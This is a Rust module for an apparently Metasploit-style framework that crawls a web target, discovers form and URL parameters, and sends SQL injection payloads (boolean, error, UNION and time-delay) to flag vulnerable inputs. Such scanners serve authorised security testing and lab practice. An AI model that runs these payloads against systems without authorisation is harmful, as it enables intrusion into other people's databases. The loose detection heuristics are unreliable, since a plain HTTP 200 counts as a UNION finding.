//! Advanced SQL Injection Scanner Module
//!
//! - Automatically discovers GET/POST parameters via light crawling and form parsing
//! - Establishes a baseline and compares responses for boolean/time-based anomalies
//! - Tests with multiple payload families (Error/Boolean/Union/Time)
//! - Supports custom Host header (virtual hosting) and concurrency control
//!
//! Options (set via CLI `set KEY value`):
//!   RHOSTS=<url>            // Target URL or base URL for crawling
//!   AUTO_DISCOVER=true|false
//!   CRAWL_DEPTH=<usize>     // Default: 2
//!   THREADS=<usize>         // Default: 10
//!   TIMEOUT=<usize>         // Seconds per request, Default: 15
//!   HOST=<vhost>            // Optional Host header override
//!   METHODS=BOTH|GET|POST   // Filter which methods to test (after discovery)
//!   PARAMS=id,user,...      // Manual parameters if AUTO_DISCOVER=false or none found
//!
//! Example:
//!   use auxiliary/sql_injection
//!   set RHOSTS http://vulnerable.thm
//!   set AUTO_DISCOVER true
//!   set CRAWL_DEPTH 1
//!   set THREADS 12
//!   set HOST vulnerable.thm
//!   run

use async_trait::async_trait;
use reqwest::Client;
use scraper::{Html, Selector};
use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::Semaphore;
use tokio::time::timeout;
use url::Url;

use crate::core::module_handler::Module;
use crate::utils::helpers::{extract_bool_option, extract_option, extract_usize_option};
use crate::utils::theme;

/// SQL injection scanner configuration and defaults.
pub struct SQLInjectionScanner {
    default_target: String,
    default_crawl_depth: usize,
    default_threads: usize,
}

impl Default for SQLInjectionScanner {
    fn default() -> Self {
        Self {
            default_target: String::from("https://httpbin.org"),
            default_crawl_depth: 2,
            default_threads: 10,
        }
    }
}

#[async_trait]
impl Module for SQLInjectionScanner {
    fn name(&self) -> &'static str {
        "auxiliary/sql_injection"
    }

    fn description(&self) -> &'static str {
        "Advanced SQL injection scanner with parameter discovery, baselining, and intelligent payload testing"
    }

    fn author(&self) -> &'static str {
        "Chthonic Underworld Team"
    }

    fn version(&self) -> &'static str {
        "3.0.1"
    }

    async fn run(&self, options: &[(String, String)]) -> Result<String, String> {
        // ---- Settings -------------------------------------------------------
        let target_url = extract_option(options, "RHOSTS")
            .map(|s| s.as_str())
            .unwrap_or(&self.default_target);

        let auto_discover = extract_bool_option(options, "AUTO_DISCOVER").unwrap_or(true);
        let crawl_depth = extract_usize_option(options, "CRAWL_DEPTH").unwrap_or(self.default_crawl_depth);
        let max_threads = extract_usize_option(options, "THREADS").unwrap_or(self.default_threads);
        let timeout_secs = extract_usize_option(options, "TIMEOUT").unwrap_or(15);
        let host_header = extract_option(options, "HOST").map(|s| s.as_str());

        let method_filter = extract_option(options, "METHODS")
            .map(|s| s.to_ascii_uppercase())
            .unwrap_or_else(|| "BOTH".to_string()); // BOTH | GET | POST

        println!("{}", theme::info(&format!("Starting advanced SQL injection scan on: {}", target_url)));
        println!("{}", theme::warning("Phase 1: Target Analysis"));
        println!("{}", theme::divider());

        // ---- HTTP client & concurrency -------------------------------------
        let client = Client::builder()
            .timeout(Duration::from_secs(timeout_secs as u64))
            .user_agent("Chthonic/3.0 SQL Scanner")
            .build()
            .map_err(|e| format!("Failed to create HTTP client: {}", e))?;

        let semaphore = Arc::new(Semaphore::new(max_threads));

        // ---- Phase 1: Parameter discovery -----------------------------------
        let discovered_params = if auto_discover {
            println!("{}", theme::info("Auto-discovery enabled: crawling & parsing..."));
            discover_parameters(&client, target_url, crawl_depth, host_header, semaphore.clone()).await?
        } else {
            Vec::new()
        };

        // Build final test target list (discovered or manual fallback)
        let mut targets: Vec<ParameterInfo> = if !discovered_params.is_empty() {
            println!("{}", theme::success(&format!("✅ Discovered {} parameters", discovered_params.len())));
            discovered_params
        } else {
            let manual_params: Vec<String> = extract_option(options, "PARAMS")
                .map(|s| s.split(',').map(|p| p.trim().to_string()).filter(|p| !p.is_empty()).collect())
                .unwrap_or_else(|| vec!["id".to_string(), "product".to_string(), "category".to_string()]);

            println!("{}", theme::warning(&format!("Using manual parameters: {}", manual_params.join(", "))));
            manual_params
                .into_iter()
                .map(|name| ParameterInfo {
                    name,
                    source: target_url.to_string(),
                    method: "GET".to_string(),
                    action_url: target_url.to_string(),
                    context: "Manual".to_string(),
                    sample_value: None,
                    form_fields: Vec::new(),
                })
                .collect()
        };

        // Optional method filter
        if method_filter != "BOTH" {
            targets.retain(|p| p.method.eq_ignore_ascii_case(&method_filter));
        }

        // ---- Phase 2: Baseline Establishment --------------------------------
        println!("{}", theme::warning("Phase 2: Baseline Establishment"));
        println!("{}", theme::divider());

        // Use composite key to avoid collisions across pages/forms
        let mut baselines: HashMap<String, Baseline> = HashMap::new();
        for target in &targets {
            if let Ok(baseline) = establish_baseline(&client, target, host_header).await {
                let key = baseline_key(target);
                baselines.insert(key, baseline);
            }
        }

        // ---- Phase 3: SQL Injection Testing ---------------------------------
        println!("{}", theme::warning("Phase 3: SQL Injection Testing"));
        println!("{}", theme::divider());

        let mut vulnerabilities = Vec::new();
        let mut total_tests = 0;

        for (i, target) in targets.iter().enumerate() {
            println!("{}", theme::info(&format!(
                "[{}/{}] Testing: {} ({})",
                i + 1,
                targets.len(),
                target.name,
                target.context
            )));

            let key = baseline_key(target);
            let baseline = baselines.get(&key).cloned();

            let test_results = test_sql_injection(&client, target, baseline, host_header, semaphore.clone()).await?;
            total_tests += test_results.len();

            for result in test_results {
                if result.vulnerable {
                    println!("{}", theme::error(&format!("🚨 VULNERABLE: {} = {}", target.name, result.payload)));
                    println!("{}", theme::warning(&format!("Evidence: {}", result.evidence)));
                    vulnerabilities.push(result);
                }
            }
        }

        // ---- Phase 4: Summary ------------------------------------------------
        println!("{}", theme::divider());
        println!("{}", theme::info(&format!(
            "Completed {} tests on {} parameters",
            total_tests,
            targets.len()
        )));

        if vulnerabilities.is_empty() {
            println!("{}", theme::success("✅ No SQL injection vulnerabilities detected"));
            Ok("Scan completed successfully - No vulnerabilities found".to_string())
        } else {
            println!(
                "{}",
                theme::error(&format!(
                    "🚨 CRITICAL: {} SQL injection vulnerabilities found!",
                    vulnerabilities.len()
                ))
            );
            for vuln in &vulnerabilities {
                println!(
                    "{}",
                    theme::warning(&format!(
                        "  • {} in '{}' parameter ({})",
                        vuln.injection_type, vuln.parameter, vuln.evidence
                    ))
                );
            }
            Ok(format!(
                "🚨 Critical: {} SQL injection vulnerabilities found",
                vulnerabilities.len()
            ))
        }
    }
}

// ===== Data structures =======================================================

#[derive(Debug, Clone)]
struct ParameterInfo {
    name: String,
    source: String,
    method: String,        // "GET" | "POST"
    action_url: String,    // Fully qualified target URL to hit
    context: String,       // URL Parameter | Form Field (GET/POST) | Manual
    sample_value: Option<String>,
    form_fields: Vec<(String, String)>, // For POST: all fields to submit
}

#[derive(Debug, Clone)]
struct Baseline {
    status: u16,
    content_length: usize,
    response_time: Duration,
    title: Option<String>,
    body_hash: u64,
}

#[derive(Debug)]
struct SqlInjectionResult {
    parameter: String,
    payload: String,
    injection_type: String,
    evidence: String,
    vulnerable: bool,
}

// ===== Discovery =============================================================

async fn discover_parameters(
    client: &Client,
    base_url: &str,
    max_depth: usize,
    host_header: Option<&str>,
    semaphore: Arc<Semaphore>,
) -> Result<Vec<ParameterInfo>, String> {
    let mut discovered: Vec<ParameterInfo> = Vec::new();
    let mut visited: HashSet<String> = HashSet::new();
    let mut queue = vec![base_url.to_string()];

    for depth in 0..=max_depth {
        let mut next_queue = Vec::new();
        let mut tasks = Vec::new();

        for url in queue.iter().cloned() {
            if !visited.insert(url.clone()) {
                continue;
            }


            let client = client.clone();
            let semaphore = semaphore.clone();
            let host_header = host_header.map(|s| s.to_string());

            tasks.push(tokio::spawn(async move {
                let _permit = semaphore.acquire().await; // released on drop
                fetch_and_parse(&client, &url, host_header.as_deref()).await
            }));
        }

        for task in tasks {
            if let Ok(Ok(Some(page_data))) = task.await {
                discovered.extend(extract_parameters_from_page(&page_data));
                next_queue.extend(page_data.links);
            }
        }

        if next_queue.is_empty() {
            break;
        }
        // Shallow crawl to the next layer
        if depth < max_depth {
            queue = next_queue;
        }
    }

    Ok(discovered)
}

async fn fetch_and_parse(client: &Client, url: &str, host_header: Option<&str>) -> Result<Option<PageData>, String> {
    let mut request = client.get(url);
    if let Some(host) = host_header {
        request = request.header("Host", host);
    }

    let response = timeout(Duration::from_secs(10), request.send())
        .await
        .map_err(|_| "Request timed out".to_string())?
        .map_err(|e| format!("HTTP error: {}", e))?;

    let body = response.text().await.map_err(|e| e.to_string())?;

    let document = Html::parse_document(&body);
    let links = extract_links(&document, url);
    let forms = extract_forms(&document, url);

    Ok(Some(PageData { url: url.to_string(), body, links, forms }))
}

fn extract_parameters_from_page(page_data: &PageData) -> Vec<ParameterInfo> {
    let mut parameters = Vec::new();

    // 1) URL query parameters
    if let Ok(url) = Url::parse(&page_data.url) {
        for (name, value) in url.query_pairs() {
            parameters.push(ParameterInfo {
                name: name.to_string(),
                source: page_data.url.clone(),
                method: "GET".to_string(),
                action_url: page_data.url.clone(),
                context: "URL Parameter".to_string(),
                sample_value: Some(value.to_string()),
                form_fields: Vec::new(),
            });
        }
    }

    // 2) Form fields
    for form in &page_data.forms {
        for (field, value) in &form.fields {
            parameters.push(ParameterInfo {
                name: field.clone(),
                source: page_data.url.clone(),
                method: form.method.clone(),
                action_url: form.action.clone(),
                context: format!("Form Field ({})", form.method),
                sample_value: Some(value.clone()),
                form_fields: form.fields.clone(),
            });
        }
    }

    parameters
}

fn extract_links(document: &Html, base_url: &str) -> Vec<String> {
    let selector = Selector::parse("a[href]").unwrap();
    let mut links = Vec::new();

    for element in document.select(&selector) {
        if let Some(href) = element.value().attr("href") {
            if let Ok(base) = Url::parse(base_url) {
                if let Ok(full_url) = base.join(href) {
                    let url_str = full_url.to_string();
                    // Keep http(s) only; ignore fragments
                    if (url_str.starts_with("http://") || url_str.starts_with("https://")) && !url_str.contains('#') {
                        links.push(url_str);
                    }
                }
            }
        }
    }

    links
}

fn extract_forms(document: &Html, base_url: &str) -> Vec<FormData> {
    let selector = Selector::parse("form").unwrap();
    let mut forms = Vec::new();

    for form in document.select(&selector) {
        let method = form.value().attr("method").unwrap_or("GET").to_ascii_uppercase();
        let action_attr = form.value().attr("action").unwrap_or("").to_string();

        let mut fields = Vec::new();
        let input_selector = Selector::parse("input[name], select[name], textarea[name]").unwrap();

        for input in form.select(&input_selector) {
            if let Some(name) = input.value().attr("name") {
                let value = input.value().attr("value").unwrap_or("").to_string();
                fields.push((name.to_string(), value));
            }
        }

        // Resolve action to absolute URL (fallback to current page)
        let action = if action_attr.is_empty() {
            base_url.to_string()
        } else if let Ok(base) = Url::parse(base_url) {
            base.join(&action_attr).map(|u| u.to_string()).unwrap_or(action_attr)
        } else {
            action_attr
        };

        forms.push(FormData { method, action, fields });
    }

    forms
}

// ===== Baseline =============================================================

async fn establish_baseline(client: &Client, param: &ParameterInfo, host_header: Option<&str>) -> Result<Baseline, String> {
    let mut request = if param.method.eq_ignore_ascii_case("POST") {
        client.post(&param.action_url)
    } else {
        client.get(&param.action_url)
    };

    if let Some(host) = host_header {
        request = request.header("Host", host);
    }

    if param.method.eq_ignore_ascii_case("POST") {
        let mut form_data: HashMap<String, String> = HashMap::new();
        for (field, value) in &param.form_fields {
            form_data.insert(field.clone(), value.clone());
        }
        request = request.form(&form_data);
    }

    let start_time = Instant::now();
    let response = request.send().await.map_err(|e| e.to_string())?;
    let response_time = start_time.elapsed();
    let status = response.status().as_u16();
    let body = response.text().await.map_err(|e| e.to_string())?;

    Ok(Baseline {
        status,
        content_length: body.len(),
        response_time,
        title: extract_title(&body),
        body_hash: hash_body(&body),
    })
}

// ===== Testing ===============================================================

async fn test_sql_injection(
    client: &Client,
    param: &ParameterInfo,
    baseline: Option<Baseline>,
    host_header: Option<&str>,
    semaphore: Arc<Semaphore>,
) -> Result<Vec<SqlInjectionResult>, String> {
    let _permit = semaphore.acquire().await; // released on drop
    let mut results = Vec::new();

    // Payload families
    let payloads = vec![
        ("' OR '1'='1", "Boolean-based"),
        ("' OR '1'='2", "Boolean-based"),
        ("admin'--", "Boolean-based"),
        ("'", "Error-based"),
        ("''", "Error-based"),
        ("' UNION SELECT NULL--", "Union-based"),
        ("'; WAITFOR DELAY '00:00:05'--", "Time-based"), // SQL Server-style
    ];

    for (payload, injection_type) in payloads {
        let result = test_payload(client, param, payload, injection_type, baseline.as_ref(), host_header).await?;
        results.push(result);
    }

    Ok(results)
}

async fn test_payload(
    client: &Client,
    param: &ParameterInfo,
    payload: &str,
    injection_type: &str,
    baseline: Option<&Baseline>,
    host_header: Option<&str>,
) -> Result<SqlInjectionResult, String> {
    let mut request = if param.method.eq_ignore_ascii_case("POST") {
        client.post(&param.action_url)
    } else {
        client.get(&param.action_url)
    };

    if let Some(host) = host_header {
        request = request.header("Host", host);
    }

    if param.method.eq_ignore_ascii_case("POST") {
        let mut form_data: HashMap<String, String> = HashMap::new();
        for (field, value) in &param.form_fields {
            form_data.insert(field.clone(), value.clone());
        }
        form_data.insert(param.name.clone(), payload.to_string());
        request = request.form(&form_data);
    } else {
        let mut url = Url::parse(&param.action_url)
            .map_err(|e| format!("Bad action_url '{}': {}", &param.action_url, e))?;
        url.query_pairs_mut().append_pair(&param.name, payload);
        request = client.get(url.as_str());
        if let Some(host) = host_header {
            request = request.header("Host", host);
        }
    }

    let start_time = Instant::now();
    let response = request.send().await.map_err(|e| e.to_string())?;
    let response_time = start_time.elapsed();
    let status = response.status().as_u16();
    let body = response.text().await.map_err(|e| e.to_string())?;

    let (vulnerable, evidence) = analyze_response(&body, status, response_time, injection_type, baseline);

    Ok(SqlInjectionResult {
        parameter: param.name.clone(),
        payload: payload.to_string(),
        injection_type: injection_type.to_string(),
        evidence,
        vulnerable,
    })
}

// ===== Analysis ==============================================================

fn analyze_response(
    body: &str,
    status: u16,
    response_time: Duration,
    injection_type: &str,
    baseline: Option<&Baseline>,
) -> (bool, String) {
    let body_lower = body.to_lowercase();

    // Common SQL error signatures (multiple engines)
    let sql_errors = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "mysql server version",
        "unclosed quotation",
        "pdoexception",
        "psql:",
        "postgresql",
        "unterminated quoted string",
        "sqlite error",
        "sqlite3::",
        "ora-",
        "odbc sql server driver",
        "sqlstate",
        "syntax error",
    ];

    let has_sql_error = sql_errors.iter().any(|p| body_lower.contains(p));

    match injection_type {
        "Error-based" => {
            if has_sql_error || status >= 500 {
                let ev = if has_sql_error { "SQL error message detected" } else { "Server error response" };
                (true, ev.to_string())
            } else {
                (false, "No error-based injection detected".to_string())
            }
        }
        "Boolean-based" => {
            if let Some(b) = baseline {
                let length_diff = (body.len() as isize - b.content_length as isize).abs() as f64;
                let length_change = if b.content_length > 0 {
                    length_diff / b.content_length as f64
                } else {
                    0.0
                };

                let title_changed = extract_title(body) != b.title;
                let keyword_hit = body_lower.contains("welcome") || body_lower.contains("success") || body_lower.contains("admin");

                let vuln = length_change > 0.10 || title_changed || keyword_hit;
                let ev = if vuln {
                    format!("Boolean pattern detected (Δlen ≈ {:.1}%, title_changed={}, keywords={})",
                            length_change * 100.0, title_changed, keyword_hit)
                } else {
                    "No boolean-based injection detected".to_string()
                };
                (vuln, ev)
            } else {
                // No baseline available: fallback to coarse indicators
                let keyword_hit = body_lower.contains("welcome") || body_lower.contains("success") || body_lower.contains("admin");
                (keyword_hit, if keyword_hit {
                    "Boolean pattern heuristic matched (keywords)".to_string()
                } else {
                    "No boolean-based indicators without baseline".to_string()
                })
            }
        }
        "Time-based" => {
            if response_time.as_secs() >= 4 {
                (true, format!("Time delay detected ({}s)", response_time.as_secs()))
            } else {
                (false, "No time-based injection detected".to_string())
            }
        }
        "Union-based" => {
            let ok = status == 200 && !body_lower.contains("error");
            (
                ok,
                if ok {
                    "Union injection likely (HTTP 200 with no visible error)".to_string()
                } else {
                    "No union-based injection detected".to_string()
                },
            )
        }
        _ => (false, "Unknown injection type".to_string()),
    }
}

// ===== Utilities ==============================================================

fn extract_title(body: &str) -> Option<String> {
    let document = Html::parse_document(body);
    let selector = Selector::parse("title").ok()?;
    document
        .select(&selector)
        .next()
        .map(|title| title.text().collect::<String>().trim().to_string())
}

fn hash_body(body: &str) -> u64 {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let mut hasher = DefaultHasher::new();
    body.hash(&mut hasher);
    hasher.finish()
}

fn baseline_key(param: &ParameterInfo) -> String {
    format!("{}|{}|{}", param.action_url, param.method, param.name)
}

// ===== Page/Form parsing support ============================================

struct PageData {
    url: String,
    #[allow(dead_code)]
    body: String,
    links: Vec<String>,
    forms: Vec<FormData>,
}

#[derive(Clone)]
struct FormData {
    method: String,
    action: String,
    fields: Vec<(String, String)>,
}
